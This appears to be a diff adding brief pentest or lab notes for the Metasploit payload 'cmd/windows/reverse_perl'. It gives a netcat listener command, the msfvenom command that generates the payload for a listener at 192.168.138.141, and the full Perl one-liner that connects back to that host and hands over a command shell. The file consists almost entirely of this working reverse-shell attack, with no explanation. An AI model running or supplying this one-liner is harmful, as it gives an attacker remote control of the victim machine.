@@ -1,0 +1,27 @@
+cmd/windows/reverse_perl
+
+nc –l 3333
+
+msfvenom.bat -p cmd/windows/reverse_perl LHOST=192.168.138.141 LPORT=3333
+
+perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"192.168.138.141:3333\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
